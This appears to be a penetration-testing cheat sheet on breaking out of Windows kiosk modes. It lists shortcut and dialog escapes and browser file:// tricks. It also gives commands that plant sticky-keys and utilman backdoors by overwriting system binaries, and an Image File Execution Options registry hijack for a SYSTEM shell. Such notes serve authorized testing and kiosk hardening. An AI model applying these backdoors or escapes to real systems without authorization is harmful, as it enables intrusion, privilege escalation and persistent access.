---
tags:
  - Defense_Evasion
  - Foundational
  - Mobile
  - Privilege_Escalation
  - Windows
---

## Windows Kiosk Breakout Techniques
resources: [Windows Kiosk Configuration](https://learn.microsoft.com/en-us/windows/configuration/assigned-access/)

> [!info] Windows kiosk modes restrict users to specific applications. Goal is to escape to command execution.

### Common Kiosk Types
> - **Assigned Access** - Single-app kiosk (Windows 10/11)
> - **Shell Launcher** - Custom shell replacement
> - **Browser Kiosk** - IE/Edge in kiosk mode
> - **Third-Party** - Various kiosk software

## Keyboard Shortcuts

### Try These First
> [!tip] Common escape shortcuts:
> - **Ctrl+Alt+Del** - Security options
> - **Win+R** - Run dialog (often blocked)
> - **Win+E** - Explorer (often blocked)
> - **Ctrl+Shift+Esc** - Task Manager
> - **Win+X** - Power user menu
> - **F1** - Help (may open browser)

### Accessibility Shortcuts
> [!tip] Accessibility exploits:
> - **Win+U** - Ease of Access Center
> - **Shift x5** - Sticky Keys dialog
> - **Right Shift (8 sec)** - Filter Keys
> - **Left Alt+Left Shift+Print Screen** - High Contrast

## Browser-Based Escapes

### URL Tricks
```text
file://C:/Windows/System32/cmd.exe
file://C:/Windows/System32/
C:\Windows\System32\cmd.exe
\\127.0.0.1\c$\Windows\System32\cmd.exe
```

### JavaScript Execution
```javascript
// In address bar or console
location.href='file:///C:/Windows/System32/cmd.exe'
```

### Print Dialog Escape
> [!tip] Print dialog often allows file browsing:
> 1. Ctrl+P to open Print
> 2. Change printer
> 3. Browse for PDF/XPS output location
> 4. Navigate to C:\Windows\System32
> 5. Type cmd.exe in filename and Enter

### Save Dialog Escape
> [!tip] Save dialog escape:
> 1. Right-click, Save As
> 2. Navigate to C:\Windows\System32
> 3. Change file type to "All Files"
> 4. Type cmd.exe in filename and Enter

## File Dialog Navigation

### Address Bar Commands
```text
# Type in address bar of file dialog
C:\Windows\System32\cmd.exe
shell:startup
shell:system
```

### Network Paths
```text
\\127.0.0.1\c$\Windows\System32\
\\localhost\admin$
```

## Windows Help Escape

### Help Application Tricks
> [!tip] Help often allows hyperlinks that can execute programs.

```text
# In help search
mk:@MSITStore:C:\Windows\Help\iexplore.chm
```

### CHM File Execution
> [!tip] If can create/access CHM file, can embed command execution.

## Sticky Keys Backdoor

### Replace sethc.exe [Remote]
> [!warning] Requires prior access or boot from external media.

```cmd
copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
```

### Trigger at Login
> [!tip] Press Shift 5 times at login screen for Command prompt as SYSTEM.

## Ease of Access Backdoor

### Replace utilman.exe [Remote]
```cmd
copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
```

### Trigger at Login
> [!tip] Click Ease of Access button at login for Command prompt as SYSTEM.

## Task Manager Escape

### If Task Manager Accessible
> [!tip] Task Manager escape:
> 1. File, Run new task
> 2. Type cmd.exe
> 3. Check "Create this task with administrative privileges"

## Registry Escapes

### If regedit Accessible [Remote]
```text
# Navigate to
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options

# Create key for on-screen keyboard
osk.exe\Debugger = "cmd.exe"

# Trigger on-screen keyboard for shell
```

## PowerShell Alternatives

### Via Run Dialog [Remote]
```text
powershell
powershell -ep bypass
cmd /k powershell
```

### Via File Associations
> [!tip] Open .ps1 file to execute PowerShell.
